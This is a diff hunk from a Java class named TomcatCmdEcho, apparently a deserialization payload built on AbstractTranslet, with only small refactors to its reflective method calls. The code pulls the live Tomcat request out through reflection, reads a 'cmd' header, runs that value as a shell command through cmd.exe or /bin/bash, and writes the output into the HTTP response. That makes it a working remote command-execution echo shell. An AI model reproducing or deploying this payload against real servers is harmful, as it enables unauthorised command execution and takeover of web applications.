@@ -50,21 +50,21 @@ public class TomcatCmdEcho extends AbstractTranslet {
                         f = processor.getClass().getDeclaredField("req");
                         f.setAccessible(true);
                         Object req = f.get(processor);
-                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
+                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
                         str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
                         if (str != null && !str.isEmpty()) {
-                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
+                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
                             String[] cmds = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/bash", "-c", str};
                             byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
                             try {
                                 Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                                 obj = cls.newInstance();
-                                cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
-                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
+                                cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, result, new Integer(0), new Integer(result.length));
+                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                             } catch (NoSuchMethodException var5) {
                                 Class cls = Class.forName("java.nio.ByteBuffer");
                                 obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
-                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
+                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                             }
                             flag = true;
                         }
